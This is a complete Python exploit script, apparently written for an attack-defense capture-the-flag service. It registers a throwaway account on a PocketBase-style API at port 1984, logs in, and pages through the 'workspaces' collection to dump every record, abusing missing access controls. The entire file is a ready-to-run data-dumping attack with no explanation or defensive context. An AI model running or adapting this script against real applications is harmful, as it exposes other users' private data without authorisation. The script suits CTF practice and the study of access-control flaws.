#!/usr/bin/env python3
import sys
import json
import requests
from random import choice
from string import ascii_letters, digits

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
hint = json.loads(
    sys.argv[2]
    if len(sys.argv) > 2
    else '{"username":"vulnerable","workspace_id":"i2yy40zjs6qgitq"}'
)

URL = f'http://{host}:1984'


def random_string(length: int = 16):
    return ''.join(choice(ascii_letters + digits) for _ in range(length))


def register(session: requests.Session):
    username = random_string()
    password = random_string()

    session.post(
        f'{URL}/api/collections/users/records',
        json={
            'username': username,
            'email': f'{username}@mail.ru',
            'password': password,
            'passwordConfirm': password,
        },
    )

    resp = session.post(
        f'{URL}/api/collections/users/auth-with-password',
        json={'identity': username, 'password': password},
    )
    session.headers['Authorization'] = resp.json()['token']


def dump_pb_table(session: requests.Session, table_name: str):
    max_per_page = 500
    resp = session.get(
        f'{URL}/api/collections/{table_name}/records',
        params={
            'perPage': max_per_page,
        },
    )
    table_data = resp.json()
    print(table_data, flush=True)

    page = 1
    dumped = max_per_page
    total = table_data['totalItems']
    while dumped < total:
        page += 1
        resp = session.get(
            f'{URL}/api/collections/{table_name}/records',
            params={
                'page': page,
                'perPage': max_per_page,
            },
        )
        print(resp.json(), flush=True)
        dumped += max_per_page


def main():
    s = requests.Session()
    register(s)
    dump_pb_table(s, 'workspaces')


if __name__ == '__main__':
    main()
